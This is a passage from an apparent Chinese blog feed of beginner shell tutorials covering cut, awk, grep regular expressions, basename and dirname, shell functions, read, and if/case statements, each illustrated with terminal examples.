class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat cut.txt </span><br><span class="line">xiao hong</span><br><span class="line">xiao ming</span><br><span class="line">hello world</span><br><span class="line">bei jing</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按空格切分，取第一列</span></span><br><span class="line">[root@hadoop100 shell]# cut -d &quot; &quot; -f 1 cut.txt </span><br><span class="line">xiao</span><br><span class="line">xiao</span><br><span class="line">hello</span><br><span class="line">bei</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">按空格切分，取第二列、第三列</span></span><br><span class="line">[root@hadoop100 shell]# cut -d &quot; &quot; -f 2,3 cut.txt </span><br><span class="line">hong</span><br><span class="line">ming</span><br><span class="line">world</span><br><span class="line">jing</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切割出 world</span></span><br><span class="line">[root@hadoop100 shell]# cat cut.txt | grep hello | cut -d &quot; &quot; -f 2 </span><br><span class="line">world</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">选取系统 PATH 变量值，第 2 个“:”开始后的所有路径</span></span><br><span class="line">[root@hadoop100 shell]# echo $PATH | cut -d &quot;:&quot; -f 3-</span><br><span class="line">/usr/sbin:/usr/bin:/root/bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切割出ifconfig中的ip地址</span></span><br><span class="line">[root@hadoop100 shell]# ifconfig | grep netmask | cut -d &quot; &quot; -f 10</span><br><span class="line">172.16.80.100</span><br><span class="line">127.0.0.1</span><br><span class="line">192.168.122.1</span><br></pre></td></tr></table></figure><h1 id="二：awk"><a href="#二：awk" class="headerlink" title="二：awk"></a>二：awk</h1><h2 id="2-1-简介"><a href="#2-1-简介" class="headerlink" title="2.1 简介"></a>2.1 简介</h2><p>一个强大的文本分析工具，把文件逐行的读入，以<code>空格</code>为默认分隔符将每行切片，切开的部分再进行分析处理。</p><h2 id="2-2-基本语法"><a href="#2-2-基本语法" class="headerlink" title="2.2 基本语法"></a>2.2 基本语法</h2><ul><li>awk [选项参数] ‘&#x2F;pattern1&#x2F;{action1} &#x2F;pattern2&#x2F;{action2}…’ filename</li><li>pattern：表示 awk 在数据中查找的内容，就是匹配模式</li><li>action：在找到匹配内容时所执行的一系列命令</li></ul><h2 id="2-3-选项参数说明"><a href="#2-3-选项参数说明" class="headerlink" title="2.3 选项参数说明"></a>2.3 选项参数说明</h2><p><img src="/blog/60b4c2ae.html/image-20221212004610288.png"></p><h2 id="2-4-案例实操"><a href="#2-4-案例实操" class="headerlink" title="2.4 案例实操"></a>2.4 案例实操</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">passwd 数据的含义</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用户名:密码(加密过后的):用户 <span class="built_in">id</span>:组 <span class="built_in">id</span>:注释:用户家目录:shell 解析器</span></span><br><span class="line">[root@hadoop100 shell]# cat /etc/passwd | head -3</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 passwd 文件以 root 关键字开头的所有行，并输出该行的第 7 列</span></span><br><span class="line">[root@hadoop100 shell]# cat /etc/passwd | awk -F &quot;:&quot; &#x27;/^root/&#123;print $7&#125;&#x27;</span><br><span class="line">/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">搜索 passwd 文件以 root 关键字开头的所有行，并输出该行的第 1 列和第 7 列，中间以逗号分割。</span></span><br><span class="line">[root@hadoop100 shell]# cat /etc/passwd | awk -F &quot;:&quot; &#x27;/^root/&#123;print $1&quot;,&quot;$7&#125;&#x27;</span><br><span class="line">root,/bin/bash</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">只显示/etc/passwd 的第一列和第七列，以逗号分割，且在所有行前面添加列名 user，shell 在最后一行添加<span class="string">&quot;EOF&quot;</span>。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">BEGIN 在所有数据读取行之前执行；END 在所有数据执行之后执行。</span></span><br><span class="line">cat /etc/passwd | awk -F &quot;:&quot; &#x27;BEGIN&#123;print &quot;user,shell&quot;&#125;//&#123;print $1&quot;,&quot;$7&#125;END&#123;print &quot;EOF&quot;&#125;&#x27;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将passwd 文件中的用户 <span class="built_in">id</span> 增加数值 1 并输出</span></span><br><span class="line">cat /etc/passwd | awk -F &quot;:&quot; &#x27;//&#123;print $3+1&#125;&#x27;</span><br></pre></td></tr></table></figure><h2 id="2-5-awk-的内置变量"><a href="#2-5-awk-的内置变量" class="headerlink" title="2.5 awk 的内置变量"></a>2.5 awk 的内置变量</h2><p><img src="/blog/60b4c2ae.html/image-20221212005502650.png"></p><h2 id="2-6-案例实操"><a href="#2-6-案例实操" class="headerlink" title="2.6 案例实操"></a>2.6 案例实操</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">统计 passwd 文件名，每行的行号，每行的列</span></span><br><span class="line">awk -F &quot;:&quot; &#x27;//&#123;print &quot;文件名称：&quot;FILENAME, &quot;行号：&quot;NR, &quot;列数：&quot;NF&#125;&#x27; /etc/passwd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查询 ifconfig 命令输出结果中的空</span></span><br><span class="line">[root@hadoop100 pam.d]# ifconfig | awk -F &quot;&quot; &#x27;/^$/&#123;print &quot;空行：&quot;NR&#125;&#x27;</span><br><span class="line">空行：9</span><br><span class="line">空行：18</span><br><span class="line">空行：26</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">切割IP地址</span></span><br><span class="line">[root@hadoop100 pam.d]# ifconfig | awk -F &quot; &quot; &#x27;/netmask/&#123;print &quot;IP地址：&quot;$2&#125;&#x27;</span><br><span class="line">IP地址：172.16.80.100</span><br><span class="line">IP地址：127.0.0.1</span><br><span class="line">IP地址：192.168.122.1</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 正则表达式</title>
      <link href="/blog/90b27957.html/"/>
      <url>/blog/90b27957.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：概述"><a href="#一：概述" class="headerlink" title="一：概述"></a>一：概述</h1><ul><li>正则表达式使用单个字符串来描述、匹配一系列符合某个语法规则的字符串。</li><li>通常被用来检索、替换那些符合某个模式的文本。</li><li>在 Linux 中，grep， sed，awk 等文本处理工具都支持通过正则表达式进行模式匹配。</li></ul><h1 id="二：常规匹配"><a href="#二：常规匹配" class="headerlink" title="二：常规匹配"></a>二：常规匹配</h1><p>一串不包含特殊字符的正则表达式匹配自身；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配所有包含 ghost 的行</span></span><br><span class="line">[root@hadoop100 ~]# cat /etc/passwd | grep ghost</span><br><span class="line">ghost:x:1000:1000:ghost:/home/ghost:/bin/bash</span><br></pre></td></tr></table></figure><h1 id="三：常用特殊字符"><a href="#三：常用特殊字符" class="headerlink" title="三：常用特殊字符"></a>三：常用特殊字符</h1><h2 id="（1）特殊字符："><a href="#（1）特殊字符：" class="headerlink" title="（1）特殊字符：^"></a>（1）特殊字符：^</h2><ul><li>^ 匹配一行的开头</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配所有以a开头的行</span></span><br><span class="line">[root@hadoop100 ~]# cat /etc/passwd | grep ^a</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">abrt:x:173:173::/etc/abrt:/sbin/nologin</span><br><span class="line">avahi:x:70:70:Avahi mDNS/DNS-SD Stack:/var/run/avahi-daemon:/sbin/nologin</span><br></pre></td></tr></table></figure><h2 id="（2）特殊字符："><a href="#（2）特殊字符：" class="headerlink" title="（2）特殊字符：$"></a>（2）特殊字符：$</h2><ul><li>$ 匹配一行的结束</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配以 bash 结尾的行</span></span><br><span class="line">[root@hadoop100 ~]# cat /etc/passwd | grep bash$</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">ghost:x:1000:1000:ghost:/home/ghost:/bin/bash</span><br></pre></td></tr></table></figure><ul><li>^$ 匹配什么？</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配出 initial-setup-ks.cfg 中的空行，并显示行号</span></span><br><span class="line">[root@hadoop100 ~]# cat initial-setup-ks.cfg | grep -n ^$</span><br><span class="line">20:</span><br><span class="line">25:</span><br><span class="line">39:</span><br><span class="line">60:</span><br><span class="line">62:</span><br><span class="line">65:</span><br></pre></td></tr></table></figure><h2 id="（3）特殊字符："><a href="#（3）特殊字符：" class="headerlink" title="（3）特殊字符：."></a>（3）特殊字符：.</h2><ul><li>. 匹配一个任意的字符</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# cat /etc/passwd | grep b..h</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">chrony:x:992:987::/var/lib/chrony:/sbin/nologin</span><br><span class="line">ghost:x:1000:1000:ghost:/home/ghost:/bin/bash</span><br></pre></td></tr></table></figure><h2 id="（4）特殊字符："><a href="#（4）特殊字符：" class="headerlink" title="（4）特殊字符：*"></a>（4）特殊字符：*</h2><ul><li>* 不单独使用，他和上一个字符连用，表示匹配上一个字符 0 次或多次</li><li>匹配到：rt、rot、root、rooot…的所有行</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# cat /etc/passwd | grep ro*t</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">operator:x:11:0:operator:/root:/sbin/nologin</span><br><span class="line">abrt:x:173:173::/etc/abrt:/sbin/nologin</span><br><span class="line">rtkit:x:172:172:RealtimeKit:/proc:/sbin/nologin</span><br></pre></td></tr></table></figure><ul><li>.* 匹配什么？</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">g开头t结尾，中间是任意字符出现任意次</span></span><br><span class="line">[root@hadoop100 ~]# cat /etc/passwd | grep g.*t</span><br><span class="line">systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin</span><br><span class="line">libstoragemgmt:x:998:995:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin</span><br><span class="line">gluster:x:995:992:GlusterFS daemons:/run/gluster:/sbin/nologin</span><br><span class="line">tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin</span><br><span class="line">gnome-initial-setup:x:988:982::/run/gnome-initial-setup/:/sbin/nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin</span><br><span class="line">ghost:x:1000:1000:ghost:/home/ghost:/bin/bash</span><br></pre></td></tr></table></figure><h2 id="（5）字符区间（中括号）："><a href="#（5）字符区间（中括号）：" class="headerlink" title="（5）字符区间（中括号）：[ ]"></a>（5）字符区间（中括号）：[ ]</h2><ul><li>表示匹配某个范围内的一个字符，例如 [6,8]——匹配 6 或者 8 </li><li>[0-9]  ——匹配一个 0-9 的数字 </li><li>[0-9]* ——匹配任意长度的数字字符串</li><li>[a-z]   ——匹配一个 a-z 之间的字符</li><li>[a-z]*  ——匹配任意长度的字母字符串 </li><li>[a-c, e-f] ——匹配 a-c 或者 e-f 之间的任意字</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">匹配手机号（虚构号码）</span></span><br><span class="line">[root@hadoop100 ~]# echo 18888888888 | grep -E  ^1[3456789][0-9]&#123;9&#125;$</span><br><span class="line">18888888888</span><br></pre></td></tr></table></figure><h2 id="（6）特殊字符："><a href="#（6）特殊字符：" class="headerlink" title="（6）特殊字符：\"></a>（6）特殊字符：\</h2><ul><li>\ 表示转义，并不会单独使用。</li><li>由于所有特殊字符都有其特定匹配模式，当我们想匹配 某一特殊字符本身时（例如，我想找出所有包含 ‘$’ 的行），就会碰到困难。此时我们就要 将转义字符和特殊字符连用，来表示特殊字符本身；</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat diff.sh | grep &#x27;\$&#x27;</span><br><span class="line">echo &#x27;=== $*  ===&#x27;</span><br><span class="line">for i in &quot;$*&quot;</span><br><span class="line">echo &quot;letter is $i&quot;</span><br><span class="line">echo &#x27;=== $@  ===&#x27;</span><br><span class="line">for i in &quot;$@&quot;</span><br><span class="line">echo &quot;letter is $i&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 函数</title>
      <link href="/blog/df281937.html/"/>
      <url>/blog/df281937.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：系统函数"><a href="#一：系统函数" class="headerlink" title="一：系统函数"></a>一：系统函数</h1><h2 id="1-1-basename"><a href="#1-1-basename" class="headerlink" title="1.1 basename"></a>1.1 basename</h2><h3 id="（1）基本语法"><a href="#（1）基本语法" class="headerlink" title="（1）基本语法"></a>（1）基本语法</h3><ul><li><p>basename [string &#x2F; pathname] [suffix]</p></li><li><p>basename 命令会删掉所有的前缀包括最后一个（‘&#x2F;’）字符，然后将字符串显示出来。</p></li><li><p>basename 可以理解为取路径里的文件名称</p></li><li><p>选项</p><ul><li>suffix 为后缀，如果 suffix 被指定了，basename 会将 pathname 或 string 中的 suffix 去掉。</li></ul></li></ul><h3 id="（2）案例实操"><a href="#（2）案例实操" class="headerlink" title="（2）案例实操"></a>（2）案例实操</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# basename /root/RupertTears/shell/parameter.sh </span><br><span class="line">parameter.sh</span><br><span class="line">[root@hadoop100 shell]# basename /root/RupertTears/shell/parameter.sh .sh</span><br><span class="line">parameter</span><br></pre></td></tr></table></figure><h2 id="1-2-dirname"><a href="#1-2-dirname" class="headerlink" title="1.2 dirname"></a>1.2 dirname</h2><h3 id="（1）基本语法-1"><a href="#（1）基本语法-1" class="headerlink" title="（1）基本语法"></a>（1）基本语法</h3><ul><li>dirname 文件绝对路径</li><li>从给定的包含绝对路径的文件名中去除文件名 （非目录的部分），然后返回剩下的路径（目录的部分）</li><li>dirname 可以理解为取文件路径的绝对路径名称</li></ul><h3 id="（2）案例实操-1"><a href="#（2）案例实操-1" class="headerlink" title="（2）案例实操"></a>（2）案例实操</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# dirname /root/RupertTears/shell/parameter.sh </span><br><span class="line">/root/RupertTears/shell</span><br></pre></td></tr></table></figure><h1 id="二：自定义函数"><a href="#二：自定义函数" class="headerlink" title="二：自定义函数"></a>二：自定义函数</h1><h2 id="2-1-基本语法"><a href="#2-1-基本语法" class="headerlink" title="2.1 基本语法"></a>2.1 基本语法</h2><p>其中 [ ] 表示的内容可以省略；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[ function ] funname[()]</span><br><span class="line">&#123;</span><br><span class="line">Action;</span><br><span class="line">[return int;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-2-经验汇总"><a href="#2-2-经验汇总" class="headerlink" title="2.2 经验汇总"></a>2.2 经验汇总</h2><ol><li>必须在调用函数地方之前，先声明函数，shell 脚本是逐行运行。</li><li>函数返回值，只能通过$?系统变量获得，可以显示加：return 返回，如果不加，将以最后一条命令运行结果，作为返回值。return 后跟数值 n(0-255)；</li><li>若想接收返回值的结果，可以 echo 结果，用 $( ) 接收到结果；</li></ol><h2 id="2-3-案例实操"><a href="#2-3-案例实操" class="headerlink" title="2.3 案例实操"></a>2.3 案例实操</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat fun.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">function add()&#123;</span><br><span class="line">s=$[$1+$2]</span><br><span class="line">echo $s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">read -p &quot;请输入第一个参数：&quot; a</span><br><span class="line">read -p &quot;请输入第二个参数：&quot; b</span><br><span class="line"></span><br><span class="line">sum=$(add $a $b)</span><br><span class="line">echo &quot;两数之和为：&quot;$sum</span><br><span class="line"></span><br><span class="line">[root@hadoop100 shell]# ./fun.sh </span><br><span class="line">请输入第一个参数：110</span><br><span class="line">请输入第二个参数：300</span><br><span class="line">两数之和为：410</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell IO交互</title>
      <link href="/blog/42ce300b.html/"/>
      <url>/blog/42ce300b.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：read-读取控制台输入"><a href="#一：read-读取控制台输入" class="headerlink" title="一：read 读取控制台输入"></a>一：read 读取控制台输入</h1><h2 id="1-1-基本语法"><a href="#1-1-基本语法" class="headerlink" title="1.1 基本语法"></a>1.1 基本语法</h2><ul><li><p>read (选项) (参数) </p></li><li><p>①选项： </p><ul><li>-p：指定读取值时的提示符； </li><li>-t：指定读取值时等待的时间（秒）如果-t 不加表示一直等待</li></ul></li><li><p>②参数：</p><ul><li>变量：指定读取值的变量名</li></ul></li></ul><h2 id="1-2-案例实操"><a href="#1-2-案例实操" class="headerlink" title="1.2 案例实操"></a>1.2 案例实操</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat while.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">i=0</span><br><span class="line">sum=0</span><br><span class="line">while [ $i -le 100 ]</span><br><span class="line">do</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sum</span>=$[<span class="variable">$sum</span>+<span class="variable">$i</span>]</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">i=$[<span class="variable">$i</span>+1]</span></span><br><span class="line">let sum+=i</span><br><span class="line">let i++</span><br><span class="line">done</span><br><span class="line">echo $sum</span><br><span class="line">[root@hadoop100 shell]# ./read.sh </span><br><span class="line">请在10秒内输入参数: Ghost</span><br><span class="line">welcome Ghost</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shell 流程控制</title>
      <link href="/blog/9098b624.html/"/>
      <url>/blog/9098b624.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：if-判断"><a href="#一：if-判断" class="headerlink" title="一：if 判断"></a>一：if 判断</h1><h2 id="1-1-基本语法"><a href="#1-1-基本语法" class="headerlink" title="1.1 基本语法"></a>1.1 基本语法</h2><h3 id="（1）单分支"><a href="#（1）单分支" class="headerlink" title="（1）单分支"></a>（1）单分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ 条件判断式 ];then</span><br><span class="line">程序</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if [ 条件判断式 ]</span><br><span class="line">then</span><br><span class="line">程序</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h3 id="（2）多分支"><a href="#（2）多分支" class="headerlink" title="（2）多分支"></a>（2）多分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if [ 条件判断式 ]</span><br><span class="line">then</span><br><span class="line">程序</span><br><span class="line">elif [ 条件判断式 ]</span><br><span class="line">then</span><br><span class="line">程序</span><br><span class="line">else</span><br><span class="line">程序</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><h2 id="1-2-注意事项"><a href="#1-2-注意事项" class="headerlink" title="1.2 注意事项"></a>1.2 注意事项</h2><ul><li>① [ 条件判断式 ]，中括号和条件判断式之间必须有空格 ；</li><li>② if 后要有空格；</li></ul><h2 id="1-3-案例实操"><a href="#1-3-案例实操" class="headerlink" title="1.3 案例实操"></a>1.3 案例实操</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# cat if.sh </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用字符串的拼接阻止程序报错</span></span><br><span class="line">if [ &quot;$1&quot;x = &quot;1&quot;x ]</span><br><span class="line">then </span><br><span class="line">echo &quot;num is one&quot;</span><br><span class="line">elif [ &quot;$1&quot;x = &quot;2&quot;x ]</span><br><span class="line">then </span><br><span class="line">echo &quot;num is two&quot;</span><br><span class="line">else </span><br><span class="line">echo &quot;others&quot;</span><br><span class="line">fi</span><br><span class="line">[root@hadoop100 shell]# ./if.sh 1</span><br><span class="line">num is one</span><br><span class="line">[root@hadoop100 shell]# ./if.sh 2</span><br><span class="line">num is two</span><br><span class="line">[root@hadoop100 shell]# ./if.sh 3</span><br><span class="line">others</span><br><span class="line">[root@hadoop100 shell]# ./if.sh </span><br><span class="line">others</span><br></pre></td></tr></table></figure><h2 id="1-4-经验汇总"><a href="#1-4-经验汇总" class="headerlink" title="1.4 经验汇总"></a>1.4 经验汇总</h2><ul><li>当需要合并分支进行判断时，可以使用 -a，同时对2个条件进行判断</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# a=19</span><br><span class="line">[root@hadoop100 shell]# if [ $a -gt 18 -a $a -lt 30  ];then  echo &quot;young&quot; ; fi</span><br><span class="line">young</span><br></pre></td></tr></table></figure><ul><li>使用 (( )) 可以直接在内部直接用数学运算符做判断</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# a=1</span><br><span class="line">[root@hadoop100 shell]# if (( $a &gt; 2  ));then echo OK; else echo OMG;fi</span><br><span class="line">OMG</span><br><span class="line">[root@hadoop100 shell]# a=3</span><br><span class="line">[root@hadoop100 shell]# if (( $a &gt; 2  ));then echo OK; else echo OMG;fi</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><ul><li>使用 { .. } 表示省略中间，直至某个阈值；</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 shell]# for i in &#123;1..100&#125;;do sum=$[$sum+$i];done;echo $sum</span><br><span class="line">5050</span><br></pre></td></tr></table></figure><h1 id="二：case-语句"><a href="#二：case-语句" class="headerlink" title="二：case 语句"></a>二：case 语句</h1><h2 id="2-1-基本语法"><a href="#2-1-基本语法" class="headerlink" title="2.1 基本语法"></a>2.1 基本语法</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">case $变量名 in</span><br><span class="line">&quot;值 1&quot;)</span><br><span class="line">如果变量的值等于值 1，则执行程序 1</span><br><span class="line">;;</span><br><span class="line">&quot;值 2&quot;)</span><br><span class="line">如果变量的值等于值 2，则执行程序 2</span><br><span class="line">;;</span><br><span class="line">…省略其他分支…</span><br><span class="line">*)</span><br><span class="line">如果变量的值都不是以上的值，则执行此程序</span><br><span class="line">;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><h2 id="2-2-注意事项"><a href="#2-2-注意事项" class="headerlink" title="2.2 注意事项"></a>2.2 注意事项</h2><ul><li>case 行尾必须为单词“in”，每一个模式匹配必须以右括号“)”结束；</li><li>双分号“;;”表示命令序列结束，相当于 java 中的 break；</li><li>最后的“*)”表示默认模式，相当于 java 中的 default；</li></ul><h2 id="2-3-案例实操"><a href="#2-3-案例实操" class="headerlink" title="2.3 案例实操"></a>2.3 案例实操</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 